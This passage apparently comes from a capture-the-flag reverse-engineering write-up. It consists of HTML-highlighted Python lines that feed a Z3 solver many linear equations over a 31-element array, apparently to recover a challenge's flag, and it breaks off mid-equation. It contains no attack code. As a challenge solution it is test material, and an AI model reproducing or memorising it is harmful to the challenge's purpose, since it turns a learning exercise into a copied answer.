class="number">7</span>]+ <span class="number">224</span> * v4[<span class="number">6</span>]+ <span class="number">208</span> * v4[<span class="number">5</span>]+ <span class="number">244</span> * v4[<span class="number">4</span>]+ <span class="number">209</span> * v4[<span class="number">3</span>]+ <span class="number">189</span> * v4[<span class="number">2</span>]+ <span class="number">302</span> * v4[<span class="number">1</span>]+ <span class="number">395</span> * v4[<span class="number">0</span>]+ <span class="number">314</span> * v4[<span class="number">17</span>]+ <span class="number">13</span> * v4[<span class="number">18</span>]+ <span class="number">310</span> * v4[<span class="number">20</span>]+ <span class="number">21</span> * v4[<span class="number">21</span>]+ <span class="number">67</span> * v4[<span class="number">27</span>]+ <span class="number">127</span> * v4[<span class="number">28</span>]+ <span class="number">100</span> * v4[<span class="number">30</span>] == <span class="number">580384</span>)</span><br><span class="line">s.add(<span class="number">293</span> * v4[<span class="number">29</span>]+ <span class="number">343</span> * v4[<span class="number">28</span>]+ <span class="number">123</span> * v4[<span class="number">27</span>]+ <span class="number">387</span> * v4[<span class="number">26</span>]+ <span class="number">114</span> * v4[<span class="number">25</span>]+ <span class="number">303</span> * v4[<span class="number">24</span>]+ <span class="number">248</span> * v4[<span class="number">23</span>]+ <span class="number">258</span> * v4[<span class="number">21</span>]+ <span class="number">218</span> * v4[<span class="number">20</span>]+ <span class="number">180</span> * v4[<span class="number">19</span>]+ <span class="number">196</span> * v4[<span class="number">18</span>]+ <span class="number">398</span> * v4[<span class="number">17</span>]+ <span class="number">398</span> * v4[<span class="number">14</span>]+ <span class="number">138</span> * v4[<span class="number">9</span>]+ <span class="number">292</span> * v4[<span class="number">8</span>]+ <span class="number">38</span> * v4[<span class="number">7</span>]+ <span class="number">179</span> * v4[<span class="number">6</span>]+ <span class="number">190</span> * v4[<span class="number">5</span>]+ <span class="number">57</span> * v4[<span class="number">4</span>]+ <span class="number">358</span> * v4[<span class="number">3</span>]+ <span class="number">191</span> * v4[<span class="number">2</span>]+ <span class="number">215</span> * v4[<span class="number">1</span>]+ <span class="number">88</span> * v4[<span class="number">0</span>]+ <span class="number">22</span> * v4[<span class="number">10</span>]+ <span class="number">72</span> * v4[<span class="number">11</span>]+ <span class="number">357</span> * v4[<span class="number">12</span>]+ <span class="number">9</span> * v4[<span class="number">13</span>]+ <span class="number">389</span> * v4[<span class="number">15</span>]+ <span class="number">81</span> * v4[<span class="number">16</span>]+ <span class="number">85</span> * v4[<span class="number">30</span>] == <span class="number">529847</span>)</span><br><span class="line">s.add(<span class="number">311</span> * v4[<span class="number">29</span>]+ <span class="number">202</span> * v4[<span class="number">28</span>]+ <span class="number">234</span> * v4[<span class="number">27</span>]+ <span class="number">272</span> * v4[<span class="number">26</span>]+ <span class="number">55</span> * v4[<span class="number">25</span>]+ <span class="number">328</span> * v4[<span class="number">24</span>]+ <span class="number">246</span> * v4[<span class="number">23</span>]+ <span class="number">362</span> * v4[<span class="number">22</span>]+ <span class="number">86</span> * v4[<span class="number">21</span>]+ <span class="number">75</span> * v4[<span class="number">20</span>]+ <span class="number">142</span> * v4[<span class="number">17</span>]+ <span class="number">244</span> * v4[<span class="number">16</span>]+ <span class="number">216</span> * v4[<span class="number">15</span>]+ <span class="number">281</span> * v4[<span class="number">14</span>]+ <span class="number">398</span> * v4[<span class="number">13</span>]+ <span class="number">322</span> * v4[<span class="number">12</span>]+ <span class="number">251</span> * v4[<span class="number">11</span>]+ <span class="number">357</span> * v4[<span class="number">8</span>]+ <span class="number">76</span> * v4[<span class="number">7</span>]+ <span class="number">292</span> * v4[<span class="number">6</span>]+ <span class="number">389</span> * v4[<span class="number">5</span>]+ <span class="number">275</span> * v4[<span class="number">4</span>]+ <span class="number">312</span> * v4[<span class="number">3</span>]+ <span class="number">200</span> * v4[<span class="number">2</span>]+ <span class="number">110</span> * v4[<span class="number">1</span>]+ <span class="number">203</span> * v4[<span class="number">0</span>]+ <span class="number">99</span> * v4[<span class="number">9</span>]+ <span class="number">21</span> * v4[<span class="number">10</span>]+ <span class="number">269</span> * v4[<span class="number">18</span>]+ <span class="number">33</span> * v4[<span class="number">19</span>]+ <span class="number">356</span> * v4[<span class="number">30</span>] == <span class="number">631652</span>)</span><br><span class="line">s.add(<span class="number">261</span> * v4[<span class="number">29</span>]+ <span class="number">189</span> * v4[<span class="number">26</span>]+ <span class="number">55</span> * v4[<span class="number">25</span>]+ <span class="number">23</span> * v4[<span class="number">24</span>]+ <span class="number">202</span> * v4[<span class="number">23</span>]+ <span class="number">185</span> * v4[<span class="number">22</span>]+ <span class="number">182</span> * v4[<span class="number">21</span>]+ <span class="number">285</span> * v4[<span class="number">20</span>]+ <span class="number">217</span> * v4[<span class="number">17</span>]+ <span class="number">157</span> * v4[<span class="number">16</span>]+ <span class="number">232</span> * v4[<span class="number">15</span>]+ <span class="number">132</span> * v4[<span class="number">14</span>]+ <span class="number">169</span> * v4[<span class="number">13</span>]+ <span class="number">154</span> * v4[<span class="number">12</span>]+ <span class="number">121</span> * v4[<span class="number">11</span>]+ <span class="number">389</span> * v4[<span class="number">10</span>]+ <span class="number">376</span> * v4[<span class="number">9</span>]+ <span class="number">292</span> * v4[<span class="number">6</span>]+ <span class="number">225</span> * v4[<span class="number">5</span>]+ <span class="number">155</span> * v4[<span class="number">4</span>]+ <span class="number">234</span> * v4[<span class="number">3</span>]+ <span class="number">149</span> * v4[<span class="number">2</span>]+ <span class="number">241</span> * v4[<span class="number">1</span>]+ <span class="number">312</span> * v4[<span class="number">0</span>]+ <span class="number">368</span> * v4[<span class="number">7</span>]+ <span class="number">129</span> * v4[<span class="number">8</span>]+ <span class="number">226</span> * v4[<span class="number">18</span>]+ <span class="number">288</span> * v4[<span class="number">19</span>]+ <span class="number">201</span> * v4[<span class="number">27</span>]+ <span class="number">288</span> * v4[<span class="number">28</span>]+ <span class="number">69</span> * v4[<span class="number">30</span>] == <span class="number">614840</span>)</span><br><span class="line">s.add(<span class="number">60</span> * v4[<span class="number">29</span>]+ <span class="number">118</span> * v4[<span class="number">28</span>]+ <span class="number">153</span> * v4[<span class="number">27</span>]+ <span class="number">139</span> * v4[<span class="number">26</span>]+ <span class="number">23</span> * v4[<span class="number">25</span>]+ <span class="number">279</span> * v4[<span class="number">24</span>]+ <span class="number">396</span> * v4[<span class="number">23</span>]+ <span class="number">287</span> * v4[<span class="number">22</span>]+ <span class="number">237</span> * v4[<span class="number">19</span>]+ <span class="number">266</span> * v4[<span class="number">18</span>]+ <span class="number">149</span> * v4[<span class="number">17</span>]+ <span class="number">193</span> * v4[<span class="number">16</span>]+ <span class="number">395</span> * v4[<span class="number">15</span>]+ <span class="number">97</span> * v4[<span class="number">14</span>]+ <span class="number">16</span> * v4[<span class="number">13</span>]+ <span class="number">286</span> * v4[<span class="number">12</span>]+ <span class="number">105</span> * v4[<span class="number">11</span>]+ <span class="number">88</span> * v4[<span class="number">10</span>]+ <span class="number">282</span> * v4[<span class="number">9</span>]+ <span class="number">55</span> * v4[<span class="number">8</span>]+ <span class="number">134</span> * v4[<span class="number">7</span>]+ <span class="number">114</span> * v4[<span class="number">6</span>]+ <span class="number">101</span> * v4[<span class="number">5</span>]+ <span class="number">116</span> * v4[<span class="number">4</span>]+ <span class="number">271</span> * v4[<span class="number">3</span>]+ <span class="number">186</span> * v4[<span class="number">2</span>]+ <span class="number">263</span> * v4[<span class="number">1</span>]+ <span class="number">313</span> * v4[<span class="number">0</span>]+ <span class="number">149</span> * v4[<span class="number">20</span>]+ <span class="number">129</span> * v4[<span class="number">21</span>]+ <span class="number">145</span> * v4[<span class="number">30</span>] == <span class="number">510398</span>)</span><br><span class="line">s.add(<span class="number">385</span> * v4[<span class="number">29</span>]+ <span class="number">53</span> * v4[<span class="number">28</span>]+ <span class="number">112</span> * v4[<span class="number">27</span>]+ <span class="number">8</span> * v4[<span class="number">26</span>]+ <span class="number">232</span> * v4[<span class="number">25</span>]+ <span class="number">145</span> * v4[<span class="number">24</span>]+ <span class="number">313</span> * v4[<span class="number">23</span>]+ <span class="number">156</span> * v4[<span class="number">22</span>]+ <span class="number">321</span> * v4[<span class="number">21</span>]+ <span class="number">358</span> * v4[<span class="number">20</span>]+ <span class="number">46</span> * v4[<span class="number">19</span>]+ <span class="number">382</span> * v4[<span class="number">18</span>]+ <span class="number">144</span> * v4[<span class="number">16</span>]+ <span class="number">222</span> * v4[<span class="number">14</span>]+ <span class="number">329</span> * v4[<span class="number">13</span>]+ <span class="number">161</span> * v4[<span class="number">12</span>]+ <span class="number">335</span> * v4[<span class="number">11</span>]+ <span class="number">50</span> * v4[<span class="number">10</span>]+ <span class="number">373</span> * v4[<span class="number">9</span>]+ <span class="number">66</span> * v4[<span class="number">8</span>]+ <span class="number">44</span> * v4[<span class="number">7</span>]+ <span class="number">59</span> * v4[<span class="number">6</span>]+ <span class="number">292</span> * v4[<span class="number">5</span>]+ <span class="number">39</span> * v4[<span class="number">4</span>]+ <span class="number">53</span> * v4[<span class="number">3</span>]+ <span class="number">310</span> * v4[<span class="number">0</span>]+ <span class="number">154</span> * v4[<span class="number">1</span>]+ <span class="number">24</span> * v4[<span class="number">2</span>]+ <span class="number">396</span> * v4[<span class="number">15</span>]+ <span class="number">81</span> * v4[<span class="number">17</span>]+ <span class="number">355</span> * v4[<span class="number">30</span>] == <span class="number">558740</span>)</span><br><span class="line">s.add(<span class="number">249</span> * v4[<span class="number">29</span>]+ <span class="number">386</span> * v4[<span class="number">28</span>]+ <span class="number">313</span> * v4[<span class="number">27</span>]+ <span class="number">74</span> * v4[<span class="number">26</span>]+ <span class="number">22</span> * v4[<span class="number">25</span>]+ <span class="number">168</span> * v4[<span class="number">24</span>]+ <span class="number">305</span> * v4[<span class="number">21</span>]+ <span class="number">358</span> * v4[<span class="number">20</span>]+ <span class="number">191</span> * v4[<span class="number">19</span>]+ <span class="number">202</span> * v4[<span class="number">18</span>]+ <span class="number">14</span> * v4[<span class="number">15</span>]+ <span class="number">114</span> * v4[<span class="number">14</span>]+ <span class="number">224</span> * v4[<span class="number">13</span>]+ <span class="number">134</span> * v4[<span class="number">12</span>]+ <span class="number">274</span> * v4[<span class="number">11</span>]+ <span class="number">372</span> * v4[<span class="number">10</span>]+ <span class="number">159</span> * v4[<span class="number">9</span>]+ <span class="number">233</span> * v4[<span class="number">8</span>]+ <span class="number">70</span> * v4[<span class="number">7</span>]+ <span class="number">287</span> * v4[<span class="number">6</span>]+ <span class="number">297</span> * v4[<span class="number">5</span>]+ <span class="number">318</span> * v4[<span class="number">4</span>]+ <span class="number">177</span> * v4[<span class="number">3</span>]+ <span class="number">173</span> * v4[<span class="number">2</span>]+ <span class="number">270</span> * v4[<span class="number">1</span>]+ <span class="number">163</span> * v4[<span class="number">0</span>]+ <span class="number">77</span> * v4[<span class="number">16</span>]+ <span class="number">25</span> * v4[<span class="number">17</span>]+ <span class="number">387</span> * v4[<span class="number">22</span>]+ <span class="number">18</span> * v4[<span class="number">23</span>]+ <span class="number">345</span> * v4[<span class="number">30</span>] == <span class="number">592365</span>)</span><br><span class="line">s.add(<span class="number">392</span> * v4[<span class="number">29</span>]+ <span class="number">385</span> * v4[<span class="number">28</span>]+ <span class="number">302</span> * v4[<span class="number">27</span>]+ <span class="number">13</span> * v4[<span class="number">25</span>]+ <span class="number">27</span> * v4[<span class="number">24</span>]+ <span class="number">99</span> * v4[<span class="number">22</span>]+ <span class="number">343</span> * v4[<span class="number">19</span>]+ <span class="number">324</span> * v4[<span class="number">18</span>]+ <span class="number">223</span> * v4[<span class="number">17</span>]+ <span class="number">372</span> * v4[<span class="number">16</span>]+ <span class="number">261</span> * v4[<span class="number">15</span>]+ <span class="number">181</span> * v4[<span class="number">14</span>]+ <span class="number">203</span> * v4[<span class="number">13</span>]+ <span class="number">232</span> * v4[<span class="number">12</span>]+ <span class="number">305</span> * v4[<span class="number">11</span>]+ <span class="number">393</span> * v4[<span class="number">10</span>]+ <span class="number">325</span> * v4[<span class="number">9</span>]+ <span class="number">231</span> * v4[<span class="number">8</span>]+ <span class="number">92</span> * v4[<span class="number">7</span>]+ <span class="number">142</span> * v4[<span class="number">6</span>]+ <span class="number">22</span> * v4[<span class="number">5</span>]+ <span class="number">86</span> * v4[<span class="number">4</span>]+ <span class="number">264</span> * v4[<span class="number">3</span>]+ <span class="number">300</span> * v4[<span class="number">2</span>]+ <span class="number">387</span> * v4[<span class="number">1</span>]+ <span class="number">360</span> * v4[<span class="number">0</span>]+ <span class="number">225</span> * v4[<span class="number">20</span>]+ <span class="number">127</span> * v4[<span class="number">21</span>]+ <span class="number">2</span> * v4[<span class="number">23</span>]+ <span class="number">80</span> * v4[<span class="number">26</span>]+ <span class="number">268</span> * v4[<span class="number">30</span>] == <span class="number">619574</span>)</span><br><span class="line">s.add(<span class="number">270</span> * v4[<span class="number">28</span>]+ <span class="number">370</span> * v4[<span class="number">27</span>]+ <span class="number">235</span> * v4[<span class="number">26</span>]+ <span class="number">96</span> * v4[<span class="number">22</span>]+ <span class="number">85</span> * v4[<span class="number">20</span>]+ <span class="number">150</span> * v4[<span class="number">19</span>]+ <span class="number">140</span> * v4[<span class="number">18</span>]+ <span class="number">94</span> * v4[<span class="number">17</span>]+ <span class="number">295</span> * v4[<span class="number">16</span>]+ <span class="number">19</span> * v4[<span class="number">14</span>]+ <span class="number">176</span> * v4[<span class="number">12</span>]+ <span class="number">94</span> * v4[<span class="number">11</span>]+ <span class="number">258</span> * v4[<span class="number">10</span>]+ <span class="number">302</span> * v4[<span class="number">9</span>]+ <span class="number">171</span> * v4[<span class="number">8</span>]+ <span class="number">66</span> * v4[<span class="number">7</span>]+ <span class="number">278</span> * v4[<span class="number">6</span>]+ <span class="number">193</span> * v4[<span class="number">5</span>]+ <span class="number">251</span> * v4[<span class="number">4</span>]+ <span class="number">284</span> * v4[<span class="number">3</span>]+ <span class="number">218</span> * v4[<span class="number">2</span>]+ (v4[<span class="number">1</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">319</span> * v4[<span class="number">0</span>]+ <span class="number">125</span> * v4[<span class="number">13</span>]+ <span class="number">24</span> * v4[<span class="number">15</span>]+ <span class="number">267</span> * v4[<span class="number">21</span>]+ <span class="number">160</span> * v4[<span class="number">23</span>]+ <span class="number">111</span> * v4[<span class="number">24</span>]+ <span class="number">33</span> * v4[<span class="number">25</span>]+ <span class="number">174</span> * v4[<span class="number">29</span>]+ <span class="number">13</span> * v4[<span class="number">30</span>] == <span class="number">480557</span>)</span><br><span class="line">s.add(<span class="number">87</span> * v4[<span class="number">28</span>]+ <span class="number">260</span> * v4[<span class="number">27</span>]+ <span class="number">326</span> * v4[<span class="number">26</span>]+ <span class="number">210</span> * v4[<span class="number">25</span>]+ <span class="number">357</span> * v4[<span class="number">24</span>]+ <span class="number">170</span> * v4[<span class="number">23</span>]+ <span class="number">315</span> * v4[<span class="number">22</span>]+ <span class="number">376</span> * v4[<span class="number">21</span>]+ <span class="number">227</span> * v4[<span class="number">20</span>]+ <span class="number">43</span> * v4[<span class="number">19</span>]+ <span class="number">358</span> * v4[<span class="number">18</span>]+ <span class="number">364</span> * v4[<span class="number">17</span>]+ <span class="number">309</span> * v4[<span class="number">16</span>]+ <span class="number">282</span> * v4[<span class="number">15</span>]+ <span class="number">286</span> * v4[<span class="number">14</span>]+ <span class="number">365</span> * v4[<span class="number">13</span>]+ <span class="number">287</span> * v4[<span class="number">12</span>]+ <span class="number">377</span> * v4[<span class="number">11</span>]+ <span class="number">74</span> * v4[<span class="number">10</span>]+ <span class="number">225</span> * v4[<span class="number">9</span>]+ <span class="number">328</span> * v4[<span class="number">6</span>]+ <span class="number">223</span> * v4[<span class="number">5</span>]+ <span class="number">120</span> * v4[<span class="number">4</span>]+ <span class="number">102</span> * v4[<span class="number">3</span>]+ <span class="number">162</span> * v4[<span class="number">2</span>]+ <span class="number">123</span> * v4[<span class="number">1</span>]+ <span class="number">196</span> * v4[<span class="number">0</span>]+ <span class="number">29</span> * v4[<span class="number">7</span>]+ <span class="number">27</span> * v4[<span class="number">8</span>]+ <span class="number">352</span> * v4[<span class="number">30</span>] == <span class="number">666967</span>)</span><br><span class="line">s.add(<span class="number">61</span> * v4[<span class="number">29</span>]+ <span class="number">195</span> * v4[<span class="number">28</span>]+ <span class="number">125</span> * v4[<span class="number">27</span>]+ (v4[<span class="number">26</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">260</span> * v4[<span class="number">25</span>]+ <span class="number">202</span> * v4[<span class="number">24</span>]+ <span class="number">116</span> * v4[<span class="number">23</span>]+ <span class="number">230</span> * v4[<span class="number">22</span>]+ <span class="number">326</span> * v4[<span class="number">21</span>]+ <span class="number">211</span> * v4[<span class="number">20</span>]+ <span class="number">371</span> * v4[<span class="number">19</span>]+ <span class="number">353</span> * v4[<span class="number">16</span>]+ <span class="number">124</span> * v4[<span class="number">13</span>]+ <span class="number">188</span> * v4[<span class="number">12</span>]+ <span class="number">163</span> * v4[<span class="number">11</span>]+ <span class="number">140</span> * v4[<span class="number">10</span>]+ <span class="number">51</span> * v4[<span class="number">9</span>]+ <span class="number">262</span> * v4[<span class="number">8</span>]+ <span class="number">229</span> * v4[<span class="number">7</span>]+ <span class="number">100</span> * v4[<span class="number">6</span>]+ <span class="number">113</span> * v4[<span class="number">5</span>]+ <span class="number">158</span> * v4[<span class="number">4</span>]+ <span class="number">378</span> * v4[<span class="number">3</span>]+ <span class="number">365</span> * v4[<span class="number">2</span>]+ <span class="number">207</span> * v4[<span class="number">1</span>]+ <span class="number">277</span> * v4[<span class="number">0</span>]+ <span class="number">190</span> * v4[<span class="number">14</span>]+ <span class="number">320</span> * v4[<span class="number">15</span>]+ <span class="number">347</span> * v4[<span class="number">17</span>]+ <span class="number">11</span> * v4[<span class="number">18</span>]+ <span class="number">137</span> * v4[<span class="number">30</span>] == <span class="number">590534</span>)</span><br><span class="line">s.add(<span class="number">39</span> * v4[<span class="number">28</span>]+ <span class="number">303</span> * v4[<span class="number">27</span>]+ <span class="number">360</span> * v4[<span class="number">26</span>]+ <span class="number">157</span> * v4[<span class="number">25</span>]+ <span class="number">324</span> * v4[<span class="number">24</span>]+ <span class="number">77</span> * v4[<span class="number">23</span>]+ <span class="number">308</span> * v4[<span class="number">22</span>]+ <span class="number">313</span> * v4[<span class="number">21</span>]+ <span class="number">87</span> * v4[<span class="number">20</span>]+ <span class="number">201</span> * v4[<span class="number">19</span>]+ <span class="number">50</span> * v4[<span class="number">18</span>]+ <span class="number">60</span> * v4[<span class="number">17</span>]+ <span class="number">28</span> * v4[<span class="number">16</span>]+ <span class="number">193</span> * v4[<span class="number">15</span>]+ <span class="number">184</span> * v4[<span class="number">14</span>]+ <span class="number">205</span> * v4[<span class="number">13</span>]+ <span class="number">140</span> * v4[<span class="number">12</span>]+ <span class="number">311</span> * v4[<span class="number">11</span>]+ <span class="number">304</span> * v4[<span class="number">10</span>]+ <span class="number">35</span> * v4[<span class="number">9</span>]+ <span class="number">356</span> * v4[<span class="number">8</span>]+ <span class="number">23</span> * v4[<span class="number">5</span>]+ <span class="number">85</span> * v4[<span class="number">4</span>]+ <span class="number">156</span> * v4[<span class="number">3</span>]+ <span class="number">16</span> * v4[<span class="number">2</span>]+ <span class="number">26</span> * v4[<span class="number">1</span>]+ <span class="number">157</span> * v4[<span class="number">0</span>]+ <span class="number">150</span> * v4[<span class="number">6</span>]+ <span class="number">72</span> * v4[<span class="number">7</span>]+ <span class="number">58</span> * v4[<span class="number">29</span>] == <span class="number">429108</span>)</span><br><span class="line">s.add(<span class="number">157</span> * v4[<span class="number">29</span>]+ <span class="number">137</span> * v4[<span class="number">28</span>]+ <span class="number">71</span> * v4[<span class="number">27</span>]+ <span class="number">269</span> * v4[<span class="number">26</span>]+ <span class="number">161</span> * v4[<span class="number">25</span>]+ <span class="number">317</span> * v4[<span class="number">20</span>]+ <span class="number">296</span> * v4[<span class="number">19</span>]+ <span class="number">385</span> * v4[<span class="number">18</span>]+ <span class="number">165</span> * v4[<span class="number">13</span>]+ <span class="number">159</span> * v4[<span class="number">12</span>]+ <span class="number">132</span> * v4[<span class="number">11</span>]+ <span class="number">296</span> * v4[<span class="number">10</span>]+ <span class="number">162</span> * v4[<span class="number">7</span>]+ <span class="number">254</span> * v4[<span class="number">4</span>]+ <span class="number">172</span> * v4[<span class="number">3</span>]+ <span class="number">132</span> * v4[<span class="number">0</span>]+ <span class="number">369</span> * v4[<span class="number">1</span>]+ <span class="number">257</span> * v4[<span class="number">2</span>]+ <span class="number">134</span> * v4[<span class="number">5</span>]+ <span class="number">384</span> * v4[<span class="number">6</span>]+ <span class="number">53</span> * v4[<span class="number">8</span>]+ <span class="number">255</span> * v4[<span class="number">9</span>]+ <span class="number">229</span> * v4[<span class="number">14</span>]+ <span class="number">129</span> * v4[<span class="number">15</span>]+ <span class="number">23</span> * v4[<span class="number">16</span>]+ <span class="number">41</span> * v4[<span class="number">17</span>]+ <span class="number">112</span> * v4[<span class="number">21</span>]+ <span class="number">17</span> * v4[<span class="number">22</span>]+ <span class="number">222</span> * v4[<span class="number">23</span>]+ <span class="number">96</span> * v4[<span class="number">24</span>]+ <span class="number">126</span> * v4[<span class="number">30</span>] == <span class="number">563521</span>)</span><br><span class="line">s.add(<span class="number">207</span> * v4[<span class="number">29</span>]+ <span class="number">83</span> * v4[<span class="number">28</span>]+ <span class="number">111</span> * v4[<span class="number">27</span>]+ <span class="number">35</span> * v4[<span class="number">26</span>]+ <span class="number">67</span> * v4[<span class="number">25</span>]+ <span class="number">138</span> * v4[<span class="number">22</span>]+ <span class="number">223</span> * v4[<span class="number">21</span>]+ <span class="number">142</span> * v4[<span class="number">20</span>]+ <span class="number">154</span> * v4[<span class="number">19</span>]+ <span class="number">111</span> * v4[<span class="number">18</span>]+ <span class="number">341</span> * v4[<span class="number">17</span>]+ <span class="number">175</span> * v4[<span class="number">16</span>]+ <span class="number">259</span> * v4[<span class="number">15</span>]+ <span class="number">225</span> * v4[<span class="number">14</span>]+ <span class="number">26</span> * v4[<span class="number">11</span>]+ <span class="number">334</span> * v4[<span class="number">10</span>]+ <span class="number">250</span> * v4[<span class="number">7</span>]+ <span class="number">198</span> * v4[<span class="number">6</span>]+ <span class="number">279</span> * v4[<span class="number">5</span>]+ <span class="number">301</span> * v4[<span class="number">4</span>]+ <span class="number">193</span> * v4[<span class="number">3</span>]+ <span class="number">334</span> * v4[<span class="number">2</span>]+ <span class="number">134</span> * v4[<span class="number">0</span>]+ <span class="number">37</span> * v4[<span class="number">1</span>]+ <span class="number">183</span> * v4[<span class="number">8</span>]+ <span class="number">5</span> * v4[<span class="number">9</span>]+ <span class="number">270</span> * v4[<span class="number">12</span>]+ <span class="number">21</span> * v4[<span class="number">13</span>]+ <span class="number">275</span> * v4[<span class="number">23</span>]+ <span class="number">48</span> * v4[<span class="number">24</span>]+ <span class="number">163</span> * v4[<span class="number">30</span>] == <span class="number">493999</span>)</span><br><span class="line">s.add(<span class="number">393</span> * v4[<span class="number">29</span>]+ <span class="number">176</span> * v4[<span class="number">28</span>]+ <span class="number">105</span> * v4[<span class="number">27</span>]+ <span class="number">162</span> * v4[<span class="number">26</span>]+ <span class="number">148</span> * v4[<span class="number">25</span>]+ <span class="number">281</span> * v4[<span class="number">24</span>]+ <span class="number">300</span> * v4[<span class="number">23</span>]+ <span class="number">342</span> * v4[<span class="number">18</span>]+ <span class="number">262</span> * v4[<span class="number">17</span>]+ <span class="number">152</span> * v4[<span class="number">12</span>]+ <span class="number">43</span> * v4[<span class="number">11</span>]+ <span class="number">296</span> * v4[<span class="number">10</span>]+ <span class="number">273</span> * v4[<span class="number">9</span>]+ <span class="number">75</span> * v4[<span class="number">6</span>]+ <span class="number">18</span> * v4[<span class="number">4</span>]+ <span class="number">217</span> * v4[<span class="number">2</span>]+ <span class="number">132</span> * v4[<span class="number">1</span>]+ <span class="number">112</span> * v4[<span class="number">0</span>]+ <span class="number">210</span> * v4[<span class="number">3</span>]+ <span class="number">72</span> * v4[<span class="number">5</span>]+ <span class="number">113</span> * v4[<span class="number">7</span>]+ <span class="number">40</span> * v4[<span class="number">8</span>]+ <span class="number">278</span> * v4[<span class="number">13</span>]+ <span class="number">24</span> * v4[<span class="number">14</span>]+ <span class="number">77</span> * v4[<span class="number">15</span>]+ <span class="number">11</span> * v4[<span class="number">16</span>]+ <span class="number">55</span> * v4[<span class="number">19</span>]+ <span class="number">255</span> * v4[<span class="number">20</span>]+ <span class="number">241</span> * v4[<span class="number">21</span>]+ <span class="number">13</span> * v4[<span class="number">22</span>]+ <span class="number">356</span> * v4[<span class="number">30</span>] == <span class="number">470065</span>)</span><br><span class="line">s.add(<span class="number">369</span> * v4[<span class="number">29</span>]+ <span class="number">231</span> * v4[<span class="number">28</span>]+ <span class="number">285</span> * v4[<span class="number">25</span>]+ <span class="number">290</span> * v4[<span class="number">24</span>]+ <span class="number">297</span> * v4[<span class="number">23</span>]+ <span class="number">189</span> * v4[<span class="number">22</span>]+ <span class="number">390</span> * v4[<span class="number">21</span>]+ <span class="number">345</span> * v4[<span class="number">20</span>]+ <span class="number">153</span> * v4[<span class="number">19</span>]+ <span class="number">114</span> * v4[<span class="number">18</span>]+ <span class="number">251</span> * v4[<span class="number">17</span>]+ <span class="number">340</span> * v4[<span class="number">16</span>]+ <span class="number">44</span> * v4[<span class="number">15</span>]+ <span class="number">58</span> * v4[<span class="number">14</span>]+ <span class="number">335</span> * v4[<span class="number">13</span>]+ <span class="number">359</span> * v4[<span class="number">12</span>]+ <span class="number">392</span> * v4[<span class="number">11</span>]+ <span class="number">181</span> * v4[<span class="number">8</span>]+ <span class="number">103</span> * v4[<span class="number">7</span>]+ <span class="number">229</span> * v4[<span class="number">6</span>]+ <span class="number">175</span> * v4[<span class="number">5</span>]+ <span class="number">208</span> * v4[<span class="number">4</span>]+ <span class="number">92</span> * v4[<span class="number">3</span>]+ <span class="number">397</span> * v4[<span class="number">2</span>]+ <span class="number">349</span> * v4[<span class="number">1</span>]+ <span class="number">356</span> * v4[<span class="number">0</span>]+ (v4[<span class="number">9</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">5</span> * v4[<span class="number">10</span>]+ <span class="number">88</span> * v4[<span class="number">26</span>]+ <span class="number">40</span> * v4[<span class="number">27</span>]+ <span class="number">295</span> * v4[<span class="number">30</span>] == <span class="number">661276</span>)</span><br><span class="line">s.add(<span class="number">341</span> * v4[<span class="number">27</span>]+ <span class="number">40</span> * v4[<span class="number">25</span>]+ <span class="number">374</span> * v4[<span class="number">23</span>]+ <span class="number">201</span> * v4[<span class="number">22</span>]+ <span class="number">77</span> * v4[<span class="number">21</span>]+ <span class="number">215</span> * v4[<span class="number">20</span>]+ <span class="number">283</span> * v4[<span class="number">19</span>]+ <span class="number">213</span> * v4[<span class="number">18</span>]+ <span class="number">392</span> * v4[<span class="number">17</span>]+ <span class="number">224</span> * v4[<span class="number">16</span>]+ v4[<span class="number">15</span>]+ <span class="number">270</span> * v4[<span class="number">12</span>]+ <span class="number">28</span> * v4[<span class="number">11</span>]+ <span class="number">75</span> * v4[<span class="number">8</span>]+ <span class="number">386</span> * v4[<span class="number">7</span>]+ <span class="number">298</span> * v4[<span class="number">6</span>]+ <span class="number">170</span> * v4[<span class="number">5</span>]+ <span class="number">287</span> * v4[<span class="number">4</span>]+ <span class="number">247</span> * v4[<span class="number">3</span>]+ <span class="number">204</span> * v4[<span class="number">2</span>]+ <span class="number">103</span> * v4[<span class="number">1</span>]+ <span class="number">21</span> * v4[<span class="number">0</span>]+ <span class="number">84</span> * v4[<span class="number">9</span>]+ <span class="number">27</span> * v4[<span class="number">10</span>]+ <span class="number">159</span> * v4[<span class="number">13</span>]+ <span class="number">192</span> * v4[<span class="number">14</span>]+ <span class="number">213</span> * v4[<span class="number">24</span>]+ <span class="number">129</span> * v4[<span class="number">26</span>]+ <span class="number">67</span> * v4[<span class="number">28</span>]+ <span class="number">27</span> * v4[<span class="number">29</span>]+ <span class="number">361</span> * v4[<span class="number">30</span>] == <span class="number">555288</span>)</span><br><span class="line">s.add(<span class="number">106</span> * v4[<span class="number">29</span>]+ <span class="number">363</span> * v4[<span class="number">28</span>]+ <span class="number">210</span> * v4[<span class="number">27</span>]+ <span class="number">171</span> * v4[<span class="number">26</span>]+ <span class="number">289</span> * v4[<span class="number">25</span>]+ <span class="number">240</span> * v4[<span class="number">24</span>]+ <span class="number">164</span> * v4[<span class="number">23</span>]+ <span class="number">342</span> * v4[<span class="number">22</span>]+ <span class="number">391</span> * v4[<span class="number">19</span>]+ <span class="number">304</span> * v4[<span class="number">18</span>]+ <span class="number">218</span> * v4[<span class="number">17</span>]+ <span class="number">32</span> * v4[<span class="number">16</span>]+ <span class="number">350</span> * v4[<span class="number">15</span>]+ <span class="number">339</span> * v4[<span class="number">12</span>]+ <span class="number">303</span> * v4[<span class="number">11</span>]+ <span class="number">222</span> * v4[<span class="number">10</span>]+ <span class="number">298</span> * v4[<span class="number">9</span>]+ <span class="number">47</span> * v4[<span class="number">8</span>]+ <span class="number">48</span> * v4[<span class="number">6</span>]+ <span class="number">264</span> * v4[<span class="number">4</span>]+ <span class="number">113</span> * v4[<span class="number">3</span>]+ <span class="number">275</span> * v4[<span class="number">2</span>]+ <span class="number">345</span> * v4[<span class="number">1</span>]+ <span class="number">312</span> * v4[<span class="number">0</span>]+ <span class="number">171</span> * v4[<span class="number">5</span>]+ <span class="number">384</span> * v4[<span class="number">7</span>]+ <span class="number">175</span> * v4[<span class="number">13</span>]+ <span class="number">5</span> * v4[<span class="number">14</span>]+ <span class="number">113</span> * v4[<span class="number">20</span>]+ <span class="number">19</span> * v4[<span class="number">21</span>]+ <span class="number">263</span> * v4[<span class="number">30</span>] == <span 